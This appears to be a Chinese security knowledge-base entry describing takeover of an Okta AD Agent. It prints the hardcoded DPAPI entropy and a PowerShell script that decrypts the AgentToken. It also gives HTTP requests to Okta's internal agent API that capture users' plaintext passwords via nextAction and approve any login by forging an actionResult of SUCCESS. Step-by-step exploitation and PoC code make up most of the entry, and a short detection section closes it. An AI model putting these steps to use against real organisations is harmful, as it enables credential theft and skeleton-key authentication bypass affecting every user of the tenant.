---
id: cloud-cloud-iam-okta-ad-agent-token-dpapi-credential-capture-skeleton-key
title: Okta AD Agent 接管：DPAPI 解密 AgentToken 后走内部 API，nextAction 捞明文口令 / actionResult 批准任意登录
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: okta-ad-agent-token-dpapi-internal-api-auth-bypass
aliases:
- Okta AD Agent 劫持
- AgentToken 解密
- nextAction 凭据捕获
- actionResult SUCCESS
- Okta 万能钥匙
- Okta skeleton key
tags:
- okta
- cloud-iam
- hybrid-identity
- dpapi
- credential-access
- authentication-bypass
- ad-agent
- skeleton-key
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V433
  verified_at: '2026-11-09T20:12:58+08:00'
  notes: 已对照原文与截图核对：OktaAgentService.exe.config 含 BaseOktaURI/AgentToken/AgentId/AppId/ProxyPassword；dnSpy 的 DecryptString 用 ProtectedData.Unprotect(..., RandomEntropy, CurrentUser) 且 CryptographicException 回退 LocalMachine；entropy 13 字节与 PowerShell 解密输出一致；nextAction 返回明文 userName/password、actionResult SUCCESS 批准任意认证均为原文演示。未验证点：实际攻击需服务账户上下文或 masterkey。
---

## 一句话结论

攻陷运行 Okta AD Agent 的服务器后，配置里的 AgentToken 由 DPAPI 加硬编码 entropy 保护，在服务账户上下文中可解出；用该 token 调 Okta 内部 agent API，既能长轮询 `nextAction` 拿到用户认证时的明文用户名/口令，也能直接回 `actionResult` 的 `SUCCESS` 把任意认证判定为成功，实现类似万能钥匙的任意用户登录。

## 原理

- Okta AD Agent 负责把 AD 用户/组同步到 Okta，并在用户登录 Okta 时代表 Okta 向 AD 验证身份：agent 轮询 Okta 的 `nextAction`，收到含明文用户名的 `USER_AUTH` action，再向 AD 验证后回传 `actionResult`；Okta 信任 agent 的结论。
- 配置文件 `OktaAgentService.exe.config` 中，`AgentToken` 是以 Base64 存储的 DPAPI blob，`AppId`、`AgentId`、`BaseOktaURI` 同在其中；`ProxyPassword` 也用同样的 DPAPI 保护。反编译可见 `DecryptString`：`Convert.FromBase64String` 后调用 `ProtectedData.Unprotect(bytes, RandomEntropy, CurrentUser)`，失败时回退 `LocalMachine`，最后按 Unicode 还原字符串。
- `RandomEntropy` 是硬编码的 13 字节常量（174,53,167,191,10,250,125,232,223,147,248,86,65），因此只要能在运行服务的账户上下文执行代码（或拿到该账户的 DPAPI masterkey），就能离线/本地解出 AgentToken，不需要其他秘密。
- 该 token 是 agent 的 bearer 凭据：`GET /api/1/internal/app/activedirectory/<APPID>/agent/<AGENTID>/nextAction?agentVersion=1&pollid=anything` 会阻塞到有用户认证，返回 XML 中的 `<userName>` 与 `<password>` 明文；同 token 还可 `POST .../actionResult` 提交伪造结果。
- 把 `actionResult` 的 `status` 写成 `SUCCESS`，Okta 就认为 AD 侧验证通过，从而为任意用户建立会话——不需要知道用户口令，甚至不需要 AD 可达，因为验证结论由攻击者直接给出。

## 触发条件

- 能读取 `OktaAgentService.exe.config`（本地管理员/服务账户文件权限）。
- 能在运行 Okta AD Agent 服务的账户上下文执行代码，或能提取该账户的 DPAPI masterkey。
- AgentToken 未被轮换、租户允许该 agent 继续工作；攻击主机能访问 Okta（出网）。
- 已知 `AppId`、`AgentId`（同一配置文件）。

## 利用步骤

1. 定位默认安装路径 `C:\Program Files (x86)\Okta\Okta AD Agent\OktaAgentService.exe.config`，读取 `AgentToken`、`AppId`、`AgentId`、`BaseOktaURI`。
2. 以服务账户（如 `LAB\OktaService`）运行 PowerShell：`Add-Type -AssemblyName System.Security`，用 `[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($token), $rand, 'CurrentUser')` 解密，`[Text.Encoding]::Unicode.GetString($k)` 得到明文 token；若不在该账户上下文，则先提取 masterkey 再离线解密。
3. 凭据捕获：以 `Authorization: SSWS <AgentToken>` 请求 `GET /api/1/internal/app/activedirectory/<APPID>/agent/<AGENTID>/nextAction?agentVersion=1&pollid=anything`，等待用户认证，解析返回 XML 的 `<userName>`/`<password>`。
4. 任意认证：`POST .../agent/<AGENTID>/actionResult`，提交 `<agentActionResult><type>USER_AUTH</type><status>SUCCESS</status>...</agentActionResult>`，Okta 即接受对应登录。
5. 自动化工具可按 token 模式运行：传入 tenant-domain、api-token、app-id、agent-id 与目标口令策略参数，持续导出捕获到的凭据。

## PoC

```powershell
# 在 Okta AD Agent 服务账户上下文中解密 AgentToken
Add-Type -AssemblyName 'System.Security'
$rand = [byte[]](174,53,167,191,10,250,125,232,223,147,248,86,65)
$k = [System.Security.Cryptography.ProtectedData]::Unprotect(
      [System.Convert]::FromBase64String($agentTokenBase64), $rand,
      [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```

```http
GET /api/1/internal/app/activedirectory/<APPID>/agent/<AGENTID>/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: <tenant>.okta.com
Authorization: SSWS <AgentToken>

POST /api/1/internal/app/activedirectory/<APPID>/agent/<AGENTID>/actionResult?responseid=12345 HTTP/1.1
Host: <tenant>.okta.com
Authorization: SSWS <AgentToken>
Content-Type: application/xml; charset=utf-8

<agentActionResult actionId="<从 nextAction 响应获取>">
  <type>USER_AUTH</type>
  <status>SUCCESS</status>
</agentActionResult>
```

## 变体与关联

- 关联 [[cloud-cloud-iam-okta-fake-ad-agent-admin-oauth-token-registration]]：没有现成 AgentToken 时，可用有权限的 Okta 账户自行注册一个假 agent，达到同样的捕获/批准能力。
- 关联 [[cloud-cloud-iam-entra-connect-sync-account-password-reset-private-api]]：同类“混合身份同步组件被接管后滥用私有 API”的模式，只是产品与 API 不同。
- 边界：AgentToken/服务账户口令轮换后旧 token 失效；agent 被禁用或租户关闭同步时 nextAction 无数据；DPAPI 无法在非服务账户上下文直接解出时需 masterkey。

## 检测与防御

- 主机侧：监控对 Okta Agent 配置文件的读取、在服务账户上下文的 PowerShell/DPAPI 解密行为；限制服务账户交互式登录与文件 ACL。
- 网络侧：只允许 Agent 主机访问 Okta；监控异常主机/IP 使用同一 AgentToken 的长轮询与 actionResult，认证批准率异常（全部 SUCCESS）应立即告警。
- Okta 侧：定期轮换 AgentToken、审计 agent 行为与注册列表；对异常来源的 agent 会话强制撤销；为 agent 凭据使用专用低权限账户并启用日志。
